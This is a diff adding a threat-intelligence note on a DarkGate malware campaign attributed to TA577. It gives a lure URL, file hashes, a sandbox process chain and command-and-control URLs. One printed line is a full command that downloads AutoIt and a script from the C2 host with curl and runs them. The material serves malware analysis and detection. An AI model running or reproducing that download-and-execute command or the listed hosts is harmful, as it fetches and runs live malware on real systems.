@@ -1,0 +1,48 @@
+10.10.2023 | Darkgate | TA577
+
+*************************************************
+
+.url https://xavierliras.com/lgtv/?1
+.zip 88b5e4b1b533c398d790fbe974b2b369d72268069dcc64b53a742f4d1361c6bf
+..msi 4325d78175a803fb6a1d235e8255816a07283501087e1b115f28c38b6b542856
+
+*************************************************
+
+url > zip > msi
+
+msiexec.exe /I C:\Users\Admin\AppData\Local\Temp\Report6.msi
+
+msiexec.exe /V
+
+srtasks.exe ExecuteScopeRestorePoint /WaitForRestorePoint:2
+
+MsiExec.exe -Embedding 174D4A5C2BFDD992478A8312E3E404C3
+
+ICACLS.EXE C:\Users\Admin\AppData\Local\Temp\MW-ace1822e-d329-4ce0-b000-3726418fd015\." /SETINTEGRITYLEVEL (CI)(OI)HIGH
+
+EXPAND.EXE" -R files.cab -F:* files
+
+C:\Users\Admin\AppData\Local\Temp\MW-ace1822e-d329-4ce0-b000-3726418fd015\files\KeyScramblerLogon.exe
+
+cmd /c cd /d %temp% & curl -o Autoit3.exe http://prestige-castom.com:2351 & curl -o hnbidn.au3 http://prestige-castom.com:2351/hnbidn & Autoit3.exe hnbidn.au3
+
+curl  -o Autoit3.exe http://prestige-castom.com:2351 
+
+curl  -o hnbidn.au3 http://prestige-castom.com:2351/hnbidn 
+
+WerFault.exe -u -p 1040 -s 440
+
+cmd.exe /c rd /s /q C:\Users\Admin\AppData\Local\Temp\MW-ace1822e-d329-4ce0-b000-3726418fd015\files
+
+ICACLS.EXE" "C:\Users\Admin\AppData\Local\Temp\MW-ace1822e-d329-4ce0-b000-3726418fd015\." /SETINTEGRITYLEVEL (CI)(OI)LOW
+
+vssvc.exe
+
+WerFault.exe -pss -s 408 -p 1040 -ip 1040
+
+*************************************************
+
+c2
+
+http://prestige-castom.com:2351
+http://prestige-castom.com:2351/hnbidn
